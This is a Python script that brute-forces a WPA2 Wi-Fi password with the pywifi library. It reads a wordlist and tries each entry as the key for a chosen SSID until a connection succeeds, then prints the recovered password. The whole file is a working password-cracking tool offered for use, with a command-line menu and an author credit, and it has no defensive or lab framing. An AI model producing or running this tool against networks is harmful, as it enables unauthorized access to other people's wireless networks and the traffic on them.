#!/usr/bin/env python 3.7
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import platform
import time
import pywifi
from pywifi import PyWiFi, const, Profile

# For Windows, handle color support using colorama
try:
    from colorama import init, Fore, Style
    init()  # Initializes colorama for Windows terminal support
except ImportError:
    print("colorama module not found. Please install it with 'pip install colorama'.")

# Color definitions
RED = Fore.RED
BLUE = Fore.BLUE
CYAN = Fore.CYAN
GREEN = Fore.GREEN
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

# Initialize Wi-Fi interface
try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    iface = wifi.interfaces()[0]
    ifaces.scan()  # Check if Wi-Fi card is available
    results = ifaces.scan_results()
except Exception as e:
    print(f"[-] Error system: {e}")
    sys.exit(1)

# Function to attempt connection with a profile
def main(ssid, password, number):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(tmp_profile)
    time.sleep(0.35)

    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(BOLD, GREEN, '[*] Password Crack success!', RESET)
        print(BOLD, GREEN, '[*] Password is ' + password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, f'[ {number} ] Crack Failed using {password}', RESET)

# Function to read the wordlist and test each password
def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.strip()  # Strip the line properly
            main(ssid, line, number)

# Menu function to handle arguments and user inputs
def menu():
    parser = argparse.ArgumentParser(description='argparse Example')
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='Wordlist file ...')

    group1 = parser.add_mutually_exclusive_group()
    group1.add_argument('-v', '--version', metavar='', help='version')

    args = parser.parse_args()
    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2.5)

    # Handle arguments
    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    elif args.version:
        print("\n\n", CYAN, "by Sagar Banwa\n")
        print(RED, "github", BLUE, " : https://github.com/sagarbanwa/\n")
        exit()
    else:
        ssid = input("[*] SSID: ")
        filee = input("[*] Wordlist file: ")

    # Check if file exists and clear screen for Windows
    if os.path.exists(filee):
        if platform.system().startswith("Win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE, "[-] Cracking...")
        pwd(ssid, filee)
    else:
        print(RED, "[-] No such file.", BLUE)

if __name__ == "__main__":
    menu()
